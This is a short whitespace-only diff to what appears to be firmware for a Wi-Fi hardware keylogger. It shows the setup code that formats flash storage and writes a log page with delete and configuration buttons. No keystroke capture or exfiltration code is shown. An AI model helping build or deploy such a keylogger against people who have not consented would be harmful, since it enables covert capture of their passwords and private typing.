@@ -25,8 +25,6 @@ void init_format() {
   SPIFFS.format();
   logs = SPIFFS.open("/log.html", "a+");
   logs.println("<html><body><h2>WiFiKeylogger</h2><a class=\"myButton\" href=\"/delete\">Delete log</a><a class=\"myButton\" href=\"/configuration\">Configuration</a><p>Seleccionar idioma: </p><form target=\"_blank\"><select name=\"list\"><option value=\"https://www.google.es\"> BE<option value=\"https://www.marca.com\"> CZ<option value=\"https://www.as.com\"> DA<option value=\"https://www.google.es\"> DE<option value=\"/en\"> EN<option value=\"/es\"> ES<option value=\"https://www.google.es\"> FI<option value=\"https://www.google.es\"> FR<option value=\"https://www.google.es\"> IT<option value=\"https://www.google.es\"> PT<option value=\"https://www.google.es\"> TR</select> <input type=button value=\"Apply\" onClick=\"top.location.href=this.form.list.options[this.form.list.selectedIndex].value\"></form><style>.myButton {background-color:#599bb3;-moz-border-radius:32px;-webkit-border-radius:32px;border-radius:32px;border:2px solid #29668f;display:inline-block;cursor:pointer;color:#ffffff;font-family:Courier New;font-size:17px;padding:5px 4px;text-decoration:none;}.myButton:hover {background-color:#ffffff;}.myButton:active {position:relative;top:1px;}</style>");
-   
-  
 }
 
 void setup() {
@@ -40,7 +38,6 @@ void setup() {
   SPIFFS.begin();
   
   MDNS.addService("http","tcp",80);
-
   init_format();
   
   server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
